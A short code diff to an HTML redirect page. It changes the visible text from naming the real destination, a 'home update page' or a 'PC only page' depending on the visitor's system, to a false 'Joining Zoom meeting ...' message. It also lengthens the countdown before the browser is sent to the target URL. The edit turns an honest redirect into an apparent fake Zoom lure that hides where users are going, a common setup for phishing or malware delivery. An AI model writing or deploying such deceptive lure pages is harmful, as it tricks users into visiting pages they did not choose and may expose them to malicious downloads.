@@ -54,7 +54,7 @@
 <body>
 
 <div class="container">
-  <div class="text" id="redirectText">Redirecting...</div>
+  <div class="text" id="redirectText">Joining Zoom meeting...</div>
   <div class="progress-box">
     <div class="progress"></div>
   </div>
@@ -70,13 +70,13 @@
     var targetUrl = isMac ? pcOnlyUrl : homeUrl;
 
     var label = isMac ? "PC only page" : "home update page";
-    document.getElementById("redirectText").textContent = "Redirecting to " + label + " ...";
+    document.getElementById("redirectText").textContent = "Joining Zoom meeting ...";
 
-    var seconds = 3;
+    var seconds = 5;
     var interval = setInterval(function () {
       seconds -= 1;
       document.getElementById("redirectText").textContent =
-        "Redirecting to " + label + " (" + seconds + "s) ...";
+        "Joining Zoom meeting ...";
       if (seconds <= 0) {
         clearInterval(interval);
         window.location.href = targetUrl;
